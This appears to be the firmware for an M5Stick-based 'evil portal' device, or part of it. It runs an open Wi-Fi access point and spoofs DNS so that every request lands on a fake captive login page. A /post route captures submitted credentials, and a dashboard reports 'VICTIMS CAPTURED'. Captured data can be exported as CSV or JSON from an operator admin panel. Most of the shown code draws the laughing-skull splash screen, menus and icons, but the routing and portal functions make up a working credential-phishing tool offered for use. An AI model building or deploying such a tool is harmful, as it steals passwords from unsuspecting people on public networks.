  M5.Lcd.fillEllipse(x + 2, y + 3, rx, ry, C_BONE_SH);           // shadow
  M5.Lcd.fillEllipse(x, y, rx, ry, C_BONE);                      // main bone
  M5.Lcd.fillEllipse(x - rx / 3, y - ry / 3, rx / 3, ry / 4, C_BONE_HI); // highlight
}

// Smooth, vector-drawn skull built from basic forms (reference method: a
// dominant cranium "sphere", a separate horseshoe jaw, almond eye sockets set
// as 3D pits, a heart nasal cavity, and teeth). The jaw is a movable piece, so
// dropping it a few pixels makes the skull laugh.
// (cx, cy) is the cranium centre. `open` drops the jaw; `eyeCol` pulses the eyes.
void drawSkull(int cx, int cy, bool open, uint16_t eyeCol) {
  int jawDrop = open ? 7 : 0;

  // --- Lower jaw (mandible) -- drawn first so the cranium overlaps its top ---
  int jawTop = cy + 12 + jawDrop;
  M5.Lcd.fillRoundRect(cx - 23, jawTop + 2, 46, 30, 12, C_BONE_SH2);
  M5.Lcd.fillRoundRect(cx - 24, jawTop + 1, 46, 30, 12, C_BONE_SH);
  M5.Lcd.fillRoundRect(cx - 24, jawTop,     46, 28, 12, C_BONE);

  // --- Cranium (dominant shaded sphere) + cheekbones ---
  boneBlob(cx, cy, 41, 35);

  // --- Eye sockets: almond-shaped 3D pits, slightly below centre ---
  int ex = 18, ey = cy - 1;
  // soft shadow seat under each socket for depth
  M5.Lcd.fillEllipse(cx - ex, ey + 2, 14, 15, C_BONE_SH);
  M5.Lcd.fillEllipse(cx + ex, ey + 2, 14, 15, C_BONE_SH);
  M5.Lcd.fillEllipse(cx - ex, ey, 12, 13, C_SOCKET);
  M5.Lcd.fillEllipse(cx + ex, ey, 12, 13, C_SOCKET);
  // angled inner-top brow -> gives the skull a bit of attitude
  M5.Lcd.fillTriangle(cx - 4, cy - 15, cx - 4, cy - 2, cx - 11, cy - 12, C_BONE);
  M5.Lcd.fillTriangle(cx + 4, cy - 15, cx + 4, cy - 2, cx + 11, cy - 12, C_BONE);
  // glowing eyes + dark pupils
  M5.Lcd.fillEllipse(cx - ex, ey + 2, 7, 8, eyeCol);
  M5.Lcd.fillEllipse(cx + ex, ey + 2, 7, 8, eyeCol);
  M5.Lcd.fillCircle(cx - ex, ey + 3, 2, C_SOCKET);
  M5.Lcd.fillCircle(cx + ex, ey + 3, 2, C_SOCKET);

  // --- Nasal cavity: heart / inverted triangle ---
  int ny = cy + 9;
  M5.Lcd.fillTriangle(cx - 6, ny, cx + 6, ny, cx, ny + 13, C_SOCKET);
  M5.Lcd.fillCircle(cx - 3, ny + 1, 3, C_SOCKET);
  M5.Lcd.fillCircle(cx + 3, ny + 1, 3, C_SOCKET);

  // --- Teeth / mouth (over the cranium-jaw junction) ---
  const int mw = 40, mx = cx - mw / 2;
  int upperY = cy + 23;
  M5.Lcd.fillRoundRect(mx, upperY, mw, 8, 2, C_BONE);          // upper teeth strip
  for (int tx = mx + 6; tx < mx + mw; tx += 6)
    M5.Lcd.drawFastVLine(tx, upperY, 8, C_BONE_SH2);           // tooth gaps

  if (open) {
    M5.Lcd.fillRect(mx + 2, upperY + 8, mw - 4, 7 + jawDrop, C_SOCKET);  // open mouth
    int lowerY = upperY + 15 + jawDrop;
    M5.Lcd.fillRoundRect(mx + 4, lowerY, mw - 8, 7, 2, C_BONE);          // lower teeth
    for (int tx = mx + 10; tx < mx + mw - 4; tx += 6)
      M5.Lcd.drawFastVLine(tx, lowerY, 7, C_BONE_SH2);
  } else {
    int lowerY = upperY + 8;
    M5.Lcd.fillRoundRect(mx + 2, lowerY, mw - 4, 7, 2, C_BONE);          // lower teeth
    M5.Lcd.drawFastHLine(mx + 2, upperY + 8, mw - 4, C_BONE_SH2);        // bite line
    for (int tx = mx + 6; tx < mx + mw - 2; tx += 6)
      M5.Lcd.drawFastVLine(tx, lowerY, 7, C_BONE_SH2);
  }
}

// Boot splash: a smooth vector skull that laughs (jaw drops open/shut, pulsing
// red eyes, slight head bob) with a "HA HA HA!" burst and a progress bar.
// Runs ~5 seconds.
void bootScreen() {
  M5.Lcd.fillScreen(C_BG);

  // Static elements (drawn once): caption + progress-bar outline.
  M5.Lcd.setTextDatum(MC_DATUM);
  M5.Lcd.setTextSize(1);
  M5.Lcd.setTextColor(C_MUTED, C_BG);
  M5.Lcd.drawString("PORTAL EVIL HUEBR  -  loading", 120, 114);
  const int bx = 40, by = 124, bw = 160, bh = 7;
  M5.Lcd.drawRoundRect(bx, by, bw, bh, 3, C_MUTED);

  const int cx = 120;               // skull centre X
  const int cyBase = 38;            // cranium centre Y
  const unsigned long DURATION = 5000;  // ~5 seconds
  unsigned long start = millis();
  bool open = false;

  while (millis() - start < DURATION) {
    unsigned long el = millis() - start;
    open = !open;
    int bob = open ? 1 : 0;  // slight head bob

    // Clear the skull + laugh-text band, then redraw this frame.
    M5.Lcd.fillRect(0, 0, 240, 110, C_BG);
    drawSkull(cx, cyBase + bob, open, open ? C_EYE : C_EYEDIM);

    // "HA HA HA!" burst on the open-jaw frames.
    if (open) {
      M5.Lcd.setTextDatum(MC_DATUM);
      M5.Lcd.setTextSize(2);
      M5.Lcd.setTextColor(C_EYE, C_BG);
      M5.Lcd.drawString("HA HA HA!", 120, 101);
    }

    // Progress bar tracks elapsed time.
    int w = (int)((long)(bw - 6) * el / DURATION);
    if (w > bw - 6) w = bw - 6;
    M5.Lcd.fillRoundRect(bx + 3, by + 3, w, bh - 6, 2, C_ACCENT);

    // Short 8-bit "laugh" blip on each open frame (muteable via Config).
    if (soundOn && open) {
      M5.Beep.tone(1500);
      delay(45);
      M5.Beep.tone(1100);
      delay(45);
      M5.Beep.mute();
    }

    delay(180);
  }

  // Ensure the bar reads full before leaving.
  M5.Lcd.fillRoundRect(bx + 3, by + 3, bw - 6, bh - 6, 2, C_ACCENT);
  delay(150);
}

// Full dashboard repaint: header, SSID, gateway, and the victim-count card.
void drawMainScreen() {
  M5.Lcd.fillScreen(C_BG);

  // Header bar
  M5.Lcd.fillRect(0, 0, 240, 26, C_ACCENT);
  M5.Lcd.setTextDatum(MC_DATUM);
  M5.Lcd.setTextSize(2);
  M5.Lcd.setTextColor(TFT_WHITE, C_ACCENT);
  M5.Lcd.drawString("PORTAL EVIL HUEBR", 112, 13);
  drawStatusDot(true);

  // SSID
  M5.Lcd.setTextDatum(TL_DATUM);
  M5.Lcd.setTextSize(1);
  M5.Lcd.setTextColor(C_MUTED, C_BG);
  M5.Lcd.drawString("SSID", 8, 32);
  M5.Lcd.setTextSize(2);
  M5.Lcd.setTextColor(TFT_WHITE, C_BG);
  M5.Lcd.drawString(cfgSsid, 8, 42);

  // Battery gauge (top-right of the SSID row)
  drawBattery();

  // Admin panel link
  M5.Lcd.setTextDatum(TL_DATUM);
  M5.Lcd.setTextSize(1);
  M5.Lcd.setTextColor(C_MUTED, C_BG);
  M5.Lcd.drawString("ADMIN PANEL - OPEN ON PHONE:", 8, 63);
  M5.Lcd.setTextSize(1);
  M5.Lcd.setTextColor(C_ACCENT2, C_BG);
  M5.Lcd.drawString("http://" + APIP.toString() + "/admin", 8, 77);

  // Victim-count card
  M5.Lcd.fillRoundRect(3, 92, 234, 40, 8, C_CARD);
  M5.Lcd.setTextDatum(ML_DATUM);
  M5.Lcd.setTextSize(1);
  M5.Lcd.setTextColor(C_MUTED, C_CARD);
  M5.Lcd.drawString("VICTIMS CAPTURED", 14, 112);
  M5.Lcd.setTextDatum(MR_DATUM);
  M5.Lcd.setTextSize(4);
  M5.Lcd.setTextColor(C_COUNT, C_CARD);
  M5.Lcd.drawString(String(capcount), 226, 111);
}

void applyBrightness() {
  M5.Axp.ScreenBreath(BRIGHT_VALS[brightLevel]);
}

// Register HTTP routes once. Handlers are safe to attach before the AP is up;
// this runs a single time from setup() so repeated start/stop cycles don't
// stack duplicate handlers.
void registerRoutes() {
  // Victim-facing: capture a submission (no auth).
  webServer.on("/post", []() {
    webServer.send(HTTP_CODE, "text/html", posted());  // addCapture() bumps the counters
    if (soundOn) {
      M5.Beep.tone(4000);
      delay(50);
      M5.Beep.mute();
    }
    if (ledBlinkOn) startBlink();  // non-blocking; loop() redraws the dashboard
  });

  // Operator-facing: all gated behind the login when it is enabled.
  webServer.on("/admin", []() {
    if (!requireAuth()) return;
    webServer.send(HTTP_CODE, "text/html", creds());
  });
  webServer.on("/clear", []() {
    if (!requireAuth()) return;
    webServer.send(HTTP_CODE, "text/html", clear());
  });
  webServer.on("/export.csv", []() {
    if (!requireAuth()) return;
    webServer.sendHeader("Content-Disposition", "attachment; filename=captures.csv");
    webServer.send(HTTP_CODE, "text/csv", buildCsv());
  });
  webServer.on("/export.json", []() {
    if (!requireAuth()) return;
    webServer.sendHeader("Content-Disposition", "attachment; filename=captures.json");
    webServer.send(HTTP_CODE, "application/json", buildJson());
  });
  webServer.on("/settings", HTTP_GET, []() {
    if (!requireAuth()) return;
    webServer.send(HTTP_CODE, "text/html", settingsPage(false));
  });
  webServer.on("/settings", HTTP_POST, []() {
    if (!requireAuth()) return;
    bool restartAp = applySettings();
    webServer.send(HTTP_CODE, "text/html", settingsPage(true));
    if (restartAp) {  // SSID changed -- reply is out, now cycle the AP
      delay(200);
      WiFi.softAPdisconnect(true);
      WiFi.softAP(cfgSsid.c_str());
    }
  });

  // Everything else -> the captive portal login page (no auth).
  webServer.onNotFound([]() {
    webServer.send(HTTP_CODE, "text/html", index());
  });
}

// Bring the captive-portal AP + DNS + web server up and switch to the
// live dashboard.
void startPortal() {
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(APIP, APIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP(cfgSsid.c_str());
  dnsServer.start(DNS_PORT, "*", APIP);  // DNS spoofing (HTTP only)
  webServer.begin();
  portalStarted = true;

  appState = ST_RUNNING;
  drawMainScreen();
  previous = capcount;  // avoid an immediate redraw on the first loop tick
  dotOn = true;
  lastTick = millis();
}

// Tear the portal down and go back to idle (used when returning to the menu).
void stopPortal() {
  if (portalStarted) {
    dnsServer.stop();
    webServer.stop();
    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_OFF);
    portalStarted = false;
  }
  blinkRemaining = 0;
  digitalWrite(BUILTIN_LED, HIGH);  // LED off (active LOW)
}

// -------- Menu rendering + navigation --------

// Small vector glyphs drawn to the left of each menu row. (cx,cy) is the icon
// centre; `bg` is the row background, used for cut-outs.
enum { IC_TOOLS, IC_CONFIG, IC_POWER, IC_PLAY, IC_INFO, IC_TRASH, IC_TOGGLE, IC_BRIGHT, IC_FLIP, IC_BACK };
void drawMenuIcon(int t, int cx, int cy, uint16_t col, uint16_t bg) {
  switch (t) {
    case IC_TOOLS:                                       // sliders
      M5.Lcd.drawFastHLine(cx - 6, cy - 3, 12, col); M5.Lcd.fillRect(cx - 4, cy - 4, 3, 3, col);
      M5.Lcd.drawFastHLine(cx - 6, cy + 3, 12, col); M5.Lcd.fillRect(cx + 2, cy + 2, 3, 3, col);
      break;
    case IC_CONFIG:                                      // gear
      M5.Lcd.drawCircle(cx, cy, 4, col); M5.Lcd.fillCircle(cx, cy, 1, col);
      M5.Lcd.fillRect(cx - 1, cy - 6, 2, 2, col); M5.Lcd.fillRect(cx - 1, cy + 4, 2, 2, col);
      M5.Lcd.fillRect(cx - 6, cy - 1, 2, 2, col); M5.Lcd.fillRect(cx + 4, cy - 1, 2, 2, col);
      break;
    case IC_POWER:                                       // power symbol
      M5.Lcd.drawCircle(cx, cy + 1, 5, col);
      M5.Lcd.fillRect(cx - 3, cy - 5, 7, 3, bg);
      M5.Lcd.drawFastVLine(cx, cy - 5, 6, col);
      break;
    case IC_PLAY:                                        // play triangle
      M5.Lcd.fillTriangle(cx - 3, cy - 5, cx - 3, cy + 5, cx + 5, cy, col);
      break;
    case IC_INFO:                                        // "i"
      M5.Lcd.fillCircle(cx, cy - 4, 1, col); M5.Lcd.fillRect(cx - 1, cy - 1, 2, 6, col);
      break;
    case IC_TRASH:                                       // bin
      M5.Lcd.fillRect(cx - 4, cy - 2, 8, 7, col); M5.Lcd.fillRect(cx - 5, cy - 4, 10, 2, col);
      M5.Lcd.fillRect(cx - 1, cy - 6, 2, 2, col);
      M5.Lcd.drawFastVLine(cx - 2, cy - 1, 5, bg); M5.Lcd.drawFastVLine(cx + 1, cy - 1, 5, bg);
      break;
    case IC_TOGGLE:                                      // pill switch
      M5.Lcd.drawRoundRect(cx - 6, cy - 3, 12, 6, 3, col); M5.Lcd.fillCircle(cx + 3, cy, 2, col);
      break;
    case IC_BRIGHT:                                      // sun
      M5.Lcd.fillCircle(cx, cy, 3, col);
      M5.Lcd.drawFastVLine(cx, cy - 6, 2, col); M5.Lcd.drawFastVLine(cx, cy + 5, 2, col);
      M5.Lcd.drawFastHLine(cx - 6, cy, 2, col); M5.Lcd.drawFastHLine(cx + 5, cy, 2, col);
      M5.Lcd.fillRect(cx - 5, cy - 5, 2, 2, col); M5.Lcd.fillRect(cx + 4, cy - 5, 2, 2, col);
      M5.Lcd.fillRect(cx - 5, cy + 4, 2, 2, col); M5.Lcd.fillRect(cx + 4, cy + 4, 2, 2, col);
      break;
    case IC_FLIP:                                        // rotate box
      M5.Lcd.drawRoundRect(cx - 5, cy - 5, 10, 10, 2, col);
      M5.Lcd.fillTriangle(cx - 5, cy - 5, cx - 1, cy - 5, cx - 5, cy - 1, col);
      M5.Lcd.fillTriangle(cx + 5, cy + 5, cx + 1, cy + 5, cx + 5, cy + 1, col);
      break;
    case IC_BACK:                                        // left arrow
      M5.Lcd.fillTriangle(cx - 4, cy, cx + 1, cy - 5, cx + 1, cy + 5, col);
      M5.Lcd.fillRect(cx + 1, cy - 1, 5, 2, col);
      break;
  }
}

// Live status line under the header on the main menu: portal state, captures
// and connected clients. Redrawn on its own each tick so it stays current.
void drawStatusStrip() {
  M5.Lcd.fillRect(0, 28, 240, 14, C_BG);
  int clients = portalStarted ? WiFi.softAPgetStationNum() : 0;
  M5.Lcd.fillCircle(12, 35, 3, portalStarted ? C_OK : C_DANGER);
  M5.Lcd.setTextDatum(ML_DATUM);
  M5.Lcd.setTextSize(1);
  M5.Lcd.setTextColor(portalStarted ? C_OK : C_DANGER, C_BG);
  M5.Lcd.drawString(portalStarted ? "PORTAL ON" : "PORTAL OFF", 20, 35);
  M5.Lcd.setTextDatum(MR_DATUM);
  M5.Lcd.setTextColor(C_MUTED, C_BG);
  M5.Lcd.drawString("Caps " + String(storedCount) + "   Cli " + String(clients), 232, 35);
}

// Brief centered toast, then the caller repaints the menu.
void toastMsg(const char* msg) {
  const int w = 190, h = 42, x = (240 - w) / 2, y = (135 - h) / 2;
  M5.Lcd.fillRoundRect(x, y, w, h, 8, C_ACCENT);
  M5.Lcd.drawRoundRect(x, y, w, h, 8, C_ACCENT2);
  M5.Lcd.setTextDatum(MC_DATUM);
  M5.Lcd.setTextSize(2);
  M5.Lcd.setTextColor(TFT_WHITE, C_ACCENT);
  M5.Lcd.drawString(msg, 120, y + h / 2);
  delay(900);
}

int currentMenuCount() {
  if (appState == ST_MENU_MAIN)  return 3;  // Tools / Configuration / Exit
  if (appState == ST_MENU_TOOLS) return 4;  // Start / Info / Reset / Back
  return 5;                                 // Beep / LED / Brightness / Flip / Back
}

// Repaint the whole menu screen for the current state + selection.
void drawMenu() {
  M5.Lcd.fillScreen(C_BG);

  // Header bar with left-aligned title + battery gauge on the right.
  M5.Lcd.fillRect(0, 0, 240, 26, C_ACCENT);
  M5.Lcd.setTextDatum(ML_DATUM);
  M5.Lcd.setTextSize(2);
  M5.Lcd.setTextColor(TFT_WHITE, C_ACCENT);
  const char* title = (appState == ST_MENU_MAIN) ? "MAIN MENU"
                    : (appState == ST_MENU_TOOLS) ? "TOOLS" : "CONFIG";
  M5.Lcd.drawString(title, 8, 13);
  drawBatteryAt(206, 6, TFT_WHITE, C_ACCENT);

  // Build item labels + icons for this menu.
  String items[5];
  int icons[5];
  int n = currentMenuCount();
  if (appState == ST_MENU_MAIN) {
    items[0] = "Tools";         icons[0] = IC_TOOLS;
    items[1] = "Configuration"; icons[1] = IC_CONFIG;
    items[2] = "Exit";          icons[2] = IC_POWER;
  } else if (appState == ST_MENU_TOOLS) {
    items[0] = "Start Portal";  icons[0] = IC_PLAY;
    items[1] = "Device Info";   icons[1] = IC_INFO;
    items[2] = "Reset Captures";icons[2] = IC_TRASH;
    items[3] = "Back";          icons[3] = IC_BACK;
  } else {
    items[0] = String("Beep: ")       + (soundOn ? "ON" : "OFF");   icons[0] = IC_TOGGLE;
    items[1] = String("LED blink: ")  + (ledBlinkOn ? "ON" : "OFF");icons[1] = IC_TOGGLE;
    items[2] = String("Brightness: ") + String(brightLevel + 1);    icons[2] = IC_BRIGHT;
    items[3] = "Flip Screen";   icons[3] = IC_FLIP;
    items[4] = "Back";          icons[4] = IC_BACK;
  }

  // Layout: the main menu gets a live status strip and roomier rows; the
  // deeper menus use compact rows so up to 5 items fit.
  bool main = (appState == ST_MENU_MAIN);
  int y0, rowH, rowInner;
  if (main) { drawStatusStrip(); y0 = 46; rowH = 24; rowInner = 20; }
  else      { y0 = 28; rowH = 20; rowInner = 17; }

  for (int i = 0; i < n; i++) {
    int y = y0 + i * rowH;
    int yc = y + rowInner / 2;
    bool sel = (i == menuSel);
    uint16_t bg = sel ? C_ACCENT : C_CARD;
    uint16_t fg = sel ? TFT_WHITE : C_MUTED;
    M5.Lcd.fillRoundRect(8, y, 224, rowInner, 4, bg);
    if (sel) M5.Lcd.fillRect(8, y, 3, rowInner, C_ACCENT2);   // left accent stripe
    drawMenuIcon(icons[i], 24, yc, fg, bg);                   // row icon
    if (sel) M5.Lcd.fillTriangle(221, yc - 4, 221, yc + 4, 227, yc, TFT_WHITE);  // caret
    M5.Lcd.setTextDatum(ML_DATUM);
    M5.Lcd.setTextSize(2);
    M5.Lcd.setTextColor(fg, bg);
    M5.Lcd.drawString(items[i], 40, yc);
  }

  // Footer: controls hint + position indicator.
  M5.Lcd.setTextSize(1);
  M5.Lcd.setTextColor(C_MUTED, C_BG);
  M5.Lcd.setTextDatum(BL_DATUM);
  M5.Lcd.drawString("B:move  A:select", 6, 134);
  M5.Lcd.setTextDatum(BR_DATUM);
  M5.Lcd.drawString(String(menuSel + 1) + "/" + String(n), 234, 134);
}

// Blocking info screen; returns to the Tools menu on any button press.
void showDeviceInfo() {
  M5.Lcd.fillScreen(C_BG);
  M5.Lcd.fillRect(0, 0, 240, 26, C_ACCENT);
  M5.Lcd.setTextDatum(ML_DATUM);
  M5.Lcd.setTextSize(2);
  M5.Lcd.setTextColor(TFT_WHITE, C_ACCENT);
  M5.Lcd.drawString("DEVICE INFO", 8, 13);

  M5.Lcd.setTextSize(1);
  int clients = portalStarted ? WiFi.softAPgetStationNum() : 0;
  int y = 32;
  M5.Lcd.setTextColor(C_MUTED, C_BG);  M5.Lcd.drawString("SSID", 8, y);
  M5.Lcd.setTextColor(TFT_WHITE, C_BG); M5.Lcd.drawString(cfgSsid, 8, y + 10); y += 24;
  M5.Lcd.setTextColor(C_MUTED, C_BG);  M5.Lcd.drawString("ADMIN PANEL", 8, y);
  M5.Lcd.setTextColor(C_ACCENT2, C_BG); M5.Lcd.drawString("http://" + APIP.toString() + "/admin", 8, y + 10); y += 24;
  M5.Lcd.setTextColor(C_MUTED, C_BG);  M5.Lcd.drawString("PORTAL", 8, y);
  M5.Lcd.setTextColor(portalStarted ? C_OK : C_DANGER, C_BG);
  M5.Lcd.drawString(portalStarted ? "RUNNING" : "STOPPED", 8, y + 10); y += 24;
  M5.Lcd.setTextColor(C_MUTED, C_BG);  M5.Lcd.drawString("CAPTURES / CLIENTS", 8, y);
  M5.Lcd.setTextColor(C_COUNT, C_BG);
  M5.Lcd.drawString(String(storedCount) + " captured   -   " + String(clients) + " online", 8, y + 10);

  M5.Lcd.setTextDatum(BC_DATUM);
  M5.Lcd.setTextColor(C_MUTED, C_BG);
  M5.Lcd.drawString("Press any button to go back", 120, 134);

  while (true) {
    M5.update();
    if (M5.BtnA.wasPressed() || M5.BtnB.wasPressed()) break;
    delay(20);
  }
  appState = ST_MENU_TOOLS;
  menuSel = 1;
  drawMenu();
}

// Blocking confirm screen for Exit. BtnA powers the device off; BtnB cancels.
void doExit() {
  M5.Lcd.fillScreen(C_BG);
  M5.Lcd.setTextDatum(MC_DATUM);
  M5.Lcd.setTextSize(2);
  M5.Lcd.setTextColor(TFT_WHITE, C_BG);
  M5.Lcd.drawString("Power off?", 120, 50);
  M5.Lcd.setTextSize(1);
  M5.Lcd.setTextColor(C_MUTED, C_BG);
  M5.Lcd.drawString("BtnA = Yes       BtnB = No", 120, 90);

  while (true) {
    M5.update();
    if (M5.BtnA.wasPressed()) {
      M5.Lcd.fillScreen(C_BG);
      M5.Lcd.setTextDatum(MC_DATUM);
      M5.Lcd.setTextSize(3);
      M5.Lcd.setTextColor(C_ACCENT2, C_BG);
      M5.Lcd.drawString("Bye!", 120, 60);
      delay(700);
      M5.Axp.PowerOff();
    }
    if (M5.BtnB.wasPressed()) {
      appState = ST_MENU_MAIN;
      menuSel = 2;
      drawMenu();
      return;
    }
    delay(20);
  }
}

// Clear all captured credentials from the device (RAM only), with feedback.
void resetCaptures() {
  clearCaptures(true);  // also resets the lifetime counter
  previous = -1;        // force the dashboard to repaint if the portal is running
  toastMsg("Captures cleared");
  appState = ST_MENU_TOOLS;
  menuSel = 2;
  drawMenu();
}

// Rotate the screen 180 degrees (handy for either hand); stays on Config.
void flipScreen() {
  screenRot = (screenRot == 3) ? 1 : 3;
  M5.Lcd.setRotation(screenRot);
  saveSettings();
  appState = ST_MENU_CONFIG;
  menuSel = 3;
  drawMenu();
}

// Act on the highlighted item in the current menu.
void selectCurrent() {
  if (appState == ST_MENU_MAIN) {
    if (menuSel == 0)      { appState = ST_MENU_TOOLS;  menuSel = 0; drawMenu(); }
    else if (menuSel == 1) { appState = ST_MENU_CONFIG; menuSel = 0; drawMenu(); }
    else                   { doExit(); }
  } else if (appState == ST_MENU_TOOLS) {
    if (menuSel == 0)      { startPortal(); }           // -> ST_RUNNING
    else if (menuSel == 1) { showDeviceInfo(); }
    else if (menuSel == 2) { resetCaptures(); }
    else                   { appState = ST_MENU_MAIN; menuSel = 0; drawMenu(); }
  } else {  // ST_MENU_CONFIG
    if (menuSel == 0)      { soundOn = !soundOn; saveSettings(); drawMenu(); }
    else if (menuSel == 1) { ledBlinkOn = !ledBlinkOn; saveSettings(); drawMenu(); }
    else if (menuSel == 2) { brightLevel = (brightLevel + 1) % 3; applyBrightness(); saveSettings(); drawMenu(); }
    else if (menuSel == 3) { flipScreen(); }
    else                   { appState = ST_MENU_MAIN; menuSel = 1; drawMenu(); }
  }
}

// BtnB scrolls the selection, BtnA activates it.
void handleMenuButtons() {
  if (M5.BtnB.wasPressed()) {
    menuSel = (menuSel + 1) % currentMenuCount();
    drawMenu();
  }
  if (M5.BtnA.wasPressed()) {
    selectCurrent();
  }
}

void setup() {
  M5.begin();
  loadSettings();     // restore persisted config (SSID, login, toggles, etc.)
  M5.Lcd.setRotation(screenRot);
  pinMode(BUILTIN_LED, OUTPUT);
  digitalWrite(BUILTIN_LED, HIGH);
  applyBrightness();

  bootScreen();       // animated splash
  registerRoutes();   // attach HTTP handlers once (AP starts later, from the menu)

  appState = ST_MENU_MAIN;
  menuSel = 0;
  drawMenu();         // boot into the menu instead of auto-starting the portal
}

void loop() {
  M5.update();  // refresh button states every tick

  if (appState == ST_RUNNING) {
    // Hold the side button (BtnB) to stop the portal and return to the menu.
    if (M5.BtnB.pressedFor(800)) {
      stopPortal();
      appState = ST_MENU_MAIN;
      menuSel = 0;
      drawMenu();
      return;
    }

    if ((millis() - lastTick) > TICK_TIMER) {
      lastTick = millis();
      if (capcount != previous) {
        previous = capcount;
        drawMainScreen();   // full repaint with the new count
        dotOn = true;
      } else {
        dotOn = !dotOn;     // idle heartbeat: blink the "active" dot
        drawStatusDot(dotOn);
        drawBattery();      // keep the battery reading current
      }
    }
    updateBlink();
    dnsServer.processNextRequest();
    webServer.handleClient();
    return;
  }

  // Menu states (ST_MENU_MAIN / ST_MENU_TOOLS / ST_MENU_CONFIG)
  handleMenuButtons();

  // Keep the header battery (and the main-menu status strip) live without a
  // full repaint. Guarded so it doesn't run if a selection just left the menu.
  if (appState != ST_RUNNING && (millis() - lastTick) > TICK_TIMER) {
    lastTick = millis();
    drawBatteryAt(206, 6, TFT_WHITE, C_ACCENT);
    if (appState == ST_MENU_MAIN) drawStatusStrip();
  }
}